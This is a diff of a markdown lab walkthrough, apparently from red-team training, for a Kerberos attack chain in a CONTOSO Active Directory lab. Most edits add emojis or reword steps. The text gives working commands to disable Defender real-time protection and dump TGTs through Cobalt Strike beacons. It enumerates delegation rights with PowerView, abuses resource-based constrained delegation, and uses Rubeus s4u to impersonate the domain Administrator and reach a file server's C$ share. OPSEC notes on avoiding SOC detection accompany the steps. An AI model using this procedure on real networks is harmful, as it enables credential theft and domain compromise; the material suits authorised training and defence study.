@@ -49,7 +49,7 @@
 
 ### Defender
 
-1. Still in the admin Terminal session, on the attacker desktop machine, disable real-time Microsoft Defender Antivirus protection.  
+1. Still in the admin Terminal session, on the attacker desktop machine, disable real-time Microsoft Defender Antivirus 🛡️  
    `Set-MpPreference -DisableRealtimeMonitoring $true`  
 
 ### Current User TGT Credentials
@@ -60,7 +60,7 @@
 ⚠️ Prerequisite: Load BOF aggressor script for `krb_triage` and `krb_dump`  
 >Open > Cobalt Strike > Script Manager > Load > `C:\Tools\Kerbeus-BOF\kerbeus_cs.cna`  
 
-1. In the medium-integrity Beacon running as `pchilds`, extract their TGT.  
+1. In the medium-integrity Beacon running as `pchilds`, extract current users TGT.  
     `krb_tgtdeleg`
     
 2. Copy the returned base64 TGT ticket to clipboard.  
@@ -68,6 +68,8 @@
 3. On the Attacker desktop, run a netonly process, that opens new PowerShell window.  
     `runas /netonly /user:CONTOSO\pchilds powershell`  
 
+    Enter fake password.
+    
 4. Request a service ticket for LDAP through the proxy, in the new **spawned** PowerShell window and paste the above returned based64 TGT ticket in the `Rubeus` command:  
 
 	```Terminal-nocolor
@@ -80,16 +82,16 @@
 
 ## Enumeration
 
-1. Import PowerView module. Confirm antivirus real-time is disabled to not prevent loading `PowerView.ps1`
+1. Import PowerView module. Confirm antivirus real-time is disabled to not prevent loading `PowerView.ps1` 🛡️
    `ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1`
 
 2. Find principals that have *WriteProperty* privileges on the *msDS-AllowedToActOnBehalfOfOtherIdentity* attribute of computers.
 
-    ```PowerShell
-    Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
-    ```
+```PowerShell
+Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
+```
 
-⚠️ This will show that a principal ending in RID 1107 has this privilege over multiple computers.
+⚠️ This will show that a principal ending in RID 1107 has this privilege over multiple computers.🔍
 
 3. Query LDAP to discover what this SID is if a user, computer or group, etc.
 
@@ -97,9 +99,9 @@
     Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
     ```
 
-⚠️ This will show that it's a domain group called "Server Admins", and that *rsteel* is a member.
+⚠️ This will show that it's a domain group called "Server Admins", and that *rsteel* is a member.🔍
 
-4. Go back to Cobalt Strike and use the high-integrity Beacon running as `system` user to dump the TGT for rsteel.
+4. Go back to Cobalt Strike and use the high-integrity Beacon running in 🔥SYSTEM beacon to dump 🗝️ the TGT for rsteel.
 
     ```
     krb_triage
@@ -123,7 +125,7 @@
 6. Request a new LDAP service ticket with `rsteel` TGT, and paste in rsteel TGT base64 ticket given us LDAP tgt ticket.
 
 	```PowerShell
-	C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
+	C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:[TGT_RSTEEL] /service:ldap/lon-dc-1 /dc:lon-dc-1 /ptt
     ```
 
 ===
@@ -138,7 +140,7 @@
 
 ⚠️ Lab-confirmed (2026-04-19): LON-FS-1 already has LON-WS-1 as an existing RBCD delegate. **Do NOT overwrite** — add alongside the existing entry (see step 2).
 
-2. Add a new RBCD config between *lon-fs-1* and *lon-wkstn-1*, making sure not to overwrite the existing entry.
+2. Add a new RBCD config between *lon-fs-1* and *lon-wkstn-1*, making sure not to overwrite the existing entry.❗
 
     ```PowerShell
     $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
@@ -155,13 +157,13 @@
     Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
     ```
 
-4. Go back to Cobalt Strike again, and dump the TGT for *lon-wkstn-1* from high integrity system user beacon to enable exploitation using workstation tgt.  
+4. Go back to Cobalt Strike again, and dump 🗝️  TGT for *lon-wkstn-1* from high integrity 🔥system user beacon to enable exploitation using workstation tgt.  
 
     ```
     krb_dump /luid:3e7 /service:krbtgt
     ```
     
-    > OPSEC-🟠CAUTION — BOF, Kerberos API. Requires SYSTEM context. `/luid:3e7` = machine account session — always present on domain-joined host.
+    > OPSEC-🟠CAUTION — BOF, Kerberos API. Requires 🔥SYSTEM context. `/luid:3e7` = machine account session — always present on domain-joined host.
     > ⚠️ NO 0x prefix — `/luid:0x3e7` = "Invalid luid" error (Kerbeus-BOF lab-confirmed).  
     
 5. Use above base64 TGT ticket copied to clipboard. Request a usable service ticket for *cifs/lon-fs-1*, impersonating the default domain administrator.
@@ -170,13 +172,15 @@
     C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
     ```
 
+
 > OPSEC-🟢SAFE — Rubeus runs on the attacker desktop (not via beacon), files written locally only. Attacker desktop is not monitored by SOC blue team.
 > 
-> ⚠️ Lab-confirmed (2026-04-19): Rubeus `/outfile` with a **directory path** auto-names the files:
+> ⚠️ Rubeus `/outfile` with a **directory path** auto-names the files:
 > - S4U2self ticket: `_Administrator_to_LON-WKSTN-1$@CONTOSO.COM`
 > - S4U2proxy cifs ticket: `_cifs_lon-fs-1`
 > 
-> The file you need for `kerberos_ticket_use` is `_cifs_lon-fs-1` (no extension). Copy the exact filename from Rubeus output line:
+> The file you need for `kerberos_ticket_use` is `_cifs_lon-fs-1` (no extension). 
+> Copy the exact filename from Rubeus output line:
 > `[*] Ticket written to C:\Users\Attacker\Desktop\_cifs_lon-fs-1`
 
 6. Use the ticket file output to attacker desktop to list the C$ share content on `lon-fs-1`.
@@ -192,7 +196,7 @@
     ls \\lon-fs-1\c$
     ```
 
-> ⚠️ Lab-confirmed (2026-04-19): make_token was **not run** and `ls \\lon-fs-1\c$` succeeded. The remote server validates the Kerberos ticket content, not the local session identity — `kerberos_ticket_use` injects the ticket into the current beacon logon session directly.
+> ⚠️ Lab-confirmed 🔥 make_token was **not run** and `ls \\lon-fs-1\c$` succeeded. The remote server validates the Kerberos ticket content, not the local session identity — `kerberos_ticket_use` injects the ticket into the current beacon logon session directly.
 
 Cleanup — revoke token and purge ticket:
 
